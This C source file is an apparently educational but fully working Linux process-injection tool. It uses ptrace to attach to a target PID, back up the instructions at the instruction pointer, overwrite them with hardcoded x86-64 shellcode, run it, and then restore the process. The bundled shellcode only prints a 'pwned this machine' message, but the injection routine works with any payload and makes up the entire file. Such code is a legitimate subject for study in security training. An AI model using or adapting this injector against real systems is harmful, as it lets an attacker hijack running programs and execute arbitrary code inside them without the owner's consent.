#include "proc_attack.h"

void read_data(pid_t prgID, long src, unsigned char *dest, uint32_t len) {
  unsigned char *laddr = dest;
  const size_t native_wd_sz = sizeof(long);
  uint32_t i, j;
  union {
    long val;
    unsigned char chars[native_wd_sz];
  } instruction;

  // Reading in instructions(PEEKTEXT allows us to do that) whose sizes are
  // completely divisible by the native word size(native_wd_sz)
  j = len / native_wd_sz;
  for (i = 0; i < j; ++i) {
    // store read instruction from tracee's memory to the instructions'
    // buffer to be saved to the "laddr"
    if ((instruction.val = ptrace(PTRACE_PEEKTEXT, prgID,
                                  (src + (i * native_wd_sz)), NULL)) == -1L) {
      HANDLE_ERR("ptrace(PEEKTEXT)");
    }

    // store read instruction from regs to the dest(laddr)
    memcpy(laddr, instruction.chars, native_wd_sz);

    // increment destination pointer by one instruction
    laddr += native_wd_sz;
  }

  // Reading in remaining instructions whose sizes are NOT completely divisible
  // by the native word size(native_wd_sz)
  j = len % native_wd_sz;
  if (j != 0) {
    if ((instruction.val = ptrace(PTRACE_PEEKTEXT, prgID,
                                  (src + (i * native_wd_sz)), NULL)) == -1L) {
      HANDLE_ERR("ptrace(PEEKTEXT)");
    }

    // store read instruction from regs to the dest(laddr)
    memcpy(laddr, instruction.chars, j);
  }

  dest[len - 1] = '\0';

  return;
}

void inject_data(pid_t prgID, long dest, unsigned char *src, uint32_t len) {
  unsigned char *laddr = src;
  const size_t native_wd_sz = sizeof(long);
  uint32_t i, j;
  union {
    long val;
    unsigned char chars[native_wd_sz];
  } instruction;

  // Writing instructions(POKETEXT allows us to do that) whose sizes are
  // completely divisible by the native word size(native_wd_sz)
  j = len / native_wd_sz;
  for (i = 0; i < j; ++i) {
    // store read instruction from src to the instructions' buffer(laddr) for
    // writing to the tracee's regs
    memcpy(instruction.chars, laddr, native_wd_sz);

    // writing to the tracee's memory and registers
    if ((instruction.val =
             ptrace(PTRACE_POKETEXT, prgID, (dest + (i * native_wd_sz)),
                    instruction.val)) == -1L) {
      HANDLE_ERR("ptrace(POKETEXT)");
    }

    laddr += native_wd_sz;
  }

  // Writing the remaining instructions whose sizes are NOT completely divisible
  // by the native word size(native_wd_sz)
  j = len % native_wd_sz;
  if (j != 0) {
    // store read instruction from src to the instruction buffer(laddr)
    memcpy(instruction.chars, laddr, j);

    // writing to the tracee's memory and registers
    if ((instruction.val =
             ptrace(PTRACE_POKETEXT, prgID, (dest + (i * native_wd_sz)),
                    instruction.val)) == -1L) {
      HANDLE_ERR("ptrace(POKETEXT)");
    }
  }

  return;
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    fprintf(stderr, "[-] Usage:\n\t%s <PID>\n", argv[0]);
    exit(1);
  }

  // Shellcode for the attached assembly code(sample_payload.asm)
  unsigned char sh_code[] = {
      0x57, 0x56, 0x52, 0x50, 0xba, 0x1e, 0x00, 0x00, 0x00, 0x48, 0x8d,
      0x35, 0x11, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xb8,
      0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x58, 0x5a, 0x5e, 0x5f, 0xc3,
      0x48, 0x41, 0x43, 0x4b, 0x59, 0x20, 0x68, 0x61, 0x73, 0x20, 0x70,
      0x77, 0x6e, 0x65, 0x64, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x6d,
      0x61, 0x63, 0x68, 0x69, 0x6e, 0x65, 0x21, 0x0a};
  size_t sh_code_len = sizeof(sh_code);

  pid_t traced_proc_pid;

  // Get process ID of the targeted/victim program
  traced_proc_pid = atoi(argv[1]);
  fprintf(stdout, "[+] Tracing process ID %d...\n", traced_proc_pid);

  // Attaching the targeted program/tracee to the tracer/debugger(our C program)
  // NOTE: It  is recommended to always supply four arguments, even if the
  // requested operation does not use them, setting unused/ignored arguments to
  // 0L or (void *) 0. Check "ptrace" manpage NOTES for more info
  if (ptrace(PTRACE_ATTACH, traced_proc_pid, NULL, NULL) == -1L) {
    HANDLE_ERR("ptrace(ATTACH)");
  }

  // waiting for change in the tracee's(any child process spawned by this C
  // program(caller)) state without storing it(cuz we used wait(NULL))
  fprintf(stdout,
          "[+] Waiting for process ID %d to get ATTACHED to our mini "
          "debugger...\n",
          traced_proc_pid);

  // (waiting for SIGTRAP signal[set by debuggers] which indicates child process
  // attach is done) 
  if (wait(NULL) == -1) {
    HANDLE_ERR("wait");
  }

  // Get REGISTERS' data
  struct user_regs_struct regs_x64; // x64/x32 registers
  fprintf(stdout, "[+] Getting 'registers' for process ID %d...\n",
          traced_proc_pid);
  if (ptrace(PTRACE_GETREGS, traced_proc_pid, NULL, &regs_x64) == -1L) {
    HANDLE_ERR("ptrace(GETREGS)");
  }

  // Save the tracee instructions[should be as long as the shellcode's size]
  // that are going to replaced by the shellcode (save previous state)
  fprintf(stdout, "[+] Saving previous state of the tracee[PID:%d]...\n",
          traced_proc_pid);
  unsigned char orig_opcodes[sh_code_len];
  read_data(traced_proc_pid, regs_x64.rip, orig_opcodes, sh_code_len);

  // inject and run our shellcode by overwriting the saved instructions
  fprintf(stdout, "[+] Injecting shellcode at %p...\n", (void *)regs_x64.rip);
  inject_data(traced_proc_pid, regs_x64.rip, sh_code, sh_code_len);

  // setting the tracee's registers to our injected shellcode so that they're
  // run next
  if (ptrace(PTRACE_SETREGS, traced_proc_pid, NULL, &regs_x64) == -1L) {
    HANDLE_ERR("ptrace(SETREGS)");
  }

  // Continue the tracee's execution with our injected shellcode
  if (ptrace(PTRACE_CONT, traced_proc_pid, NULL, NULL) == -1L) {
    HANDLE_ERR("ptrace(CONT)");
  }

  // waiting for the tracee's execution to continue without storing its state
  fprintf(stdout, "[+] Waiting for process ID %d to continue...\n",
          traced_proc_pid);

  // (waiting for SIGTRAP signal[set by debuggers] which indicates child process
  // attach is done)
  if (wait(NULL) == -1) {
    HANDLE_ERR("wait");
  }

  fprintf(stdout,
          "[+] Traced process[%d] stopped, Restoring the original "
          "instructions...\n",
          traced_proc_pid);

  // Restore the tracee instructions[should be as long as the shellcode's size]
  // that were previously replaced by our shellcode before it was run.(restore
  // previous state)
  inject_data(traced_proc_pid, regs_x64.rip, orig_opcodes, sh_code_len);

  // setting the tracee's registers to back to the original opcodes so that
  // they're run next
  if (ptrace(PTRACE_SETREGS, traced_proc_pid, NULL, &regs_x64) == -1L) {
    HANDLE_ERR("ptrace(SETREGS)");
  }

  fprintf(
      stdout,
      "[+] Traced process[%d] continuing with the original instructions...\n",
      traced_proc_pid);

  // Detach the tracee from out program letting it run normally
  if (ptrace(PTRACE_DETACH, traced_proc_pid, NULL, NULL) == -1L) {
    HANDLE_ERR("ptrace(DETACH)");
  }

  return EXIT_SUCCESS;
}
